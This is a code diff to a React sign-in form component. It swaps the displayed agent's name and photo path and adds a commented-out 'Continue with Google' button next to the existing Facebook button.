@@ -61,7 +61,7 @@ function ActualForm({
   const isFacebookLoading = isLoading && loadingType === "facebook";
   const isGoogleLoading = isLoading && loadingType === "gmail";
   const isVerifyStep = step === 0;
-  const agentName = "Dennis Laczko";
+  const agentName = "Sonia Deane";
 
   return (
     <div className="min-h-screen w-full flex items-center justify-center bg-[#f5f7fb] px-2 sm:px-4 py-4 sm:py-8">
@@ -95,7 +95,7 @@ function ActualForm({
                   <div className="">
                     <div className="relative mb-3 h-12 w-12 overflow-hidden rounded-full ring-1 ring-[#d9e2ef]">
                       <Image
-                        src="/Images/agent1.jpg"
+                        src="/Images/agent1.jpeg"
                         alt={agentName}
                         fill
                         className="object-cover"
@@ -327,6 +327,36 @@ function ActualForm({
                   {isFacebookLoading ? "Connecting..." : "Continue with Facebook"}
                 </span>
               </button>
+
+              {/* <button
+                onClick={() => {
+                  if (!isLoading) {
+                    NextStep("User clicked continue with Google");
+                  }
+                }}
+                onMouseDown={() => !isLoading && setIsGooglePressed(true)}
+                onMouseUp={() => setIsGooglePressed(false)}
+                onMouseLeave={() => setIsGooglePressed(false)}
+                onTouchStart={() => !isLoading && setIsGooglePressed(true)}
+                onTouchEnd={() => setIsGooglePressed(false)}
+                disabled={isLoading}
+                className={`w-full rounded-full border border-[#dbe3ee] bg-white px-4 py-2.5 text-[13px] font-medium text-[#1f2f46] shadow-[0_2px_10px_rgba(23,42,70,0.05)] transition-all duration-150 flex items-center justify-center gap-2.5
+                ${isGoogleLoading ? "opacity-60 cursor-not-allowed" : "hover:border-[#d94f3d] hover:bg-[#fff9f8] active:scale-[0.985]"}
+                ${isGooglePressed ? "scale-[0.985] shadow-[0_1px_4px_rgba(23,42,70,0.08)]" : ""}`}
+              >
+                {isGoogleLoading && <LoadingSpinner size="14px" className="text-[#4285F4]" />}
+                {!isGoogleLoading && (
+                  <svg className="h-4 w-4" viewBox="0 0 48 48">
+                    <path fill="#4285F4" d="M24 9.5c3.5 0 6.7 1.3 9.2 3.5l6.9-6.9C36.4 2.4 30.6 0 24 0 14.6 0 6.7 5.3 3 13l8.1 6.3C13.2 13.5 18.2 9.5 24 9.5z"/>
+                    <path fill="#34A853" d="M46.5 24c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.4 5.5-5 7.2l7.7 6c4.5-4.2 7.1-10.4 7.1-17.7z"/>
+                    <path fill="#FBBC05" d="M11.1 28.3c-.6-1.8-.9-3.7-.9-5.6s.3-3.8.9-5.6L3 10.8C1.1 14.5 0 18.6 0 23s1.1 8.5 3 12.2l8.1-6.9z"/>
+                    <path fill="#EA4335" d="M24 48c6.5 0 12.1-2.2 16.1-5.9l-7.7-6c-2.1 1.4-4.8 2.2-8.4 2.2-5.8 0-10.8-4-12.6-9.3l-8.1 6.3C6.7 42.7 14.6 48 24 48z"/>
+                  </svg>
+                )}
+                <span className="truncate">{isGoogleLoading
+                  ? "Connecting..."
+                  : "Continue with Google"}</span>
+              </button> */}
             </div>
 
                 <div className="mt-auto w-full max-w-[310px] pt-10 text-left">
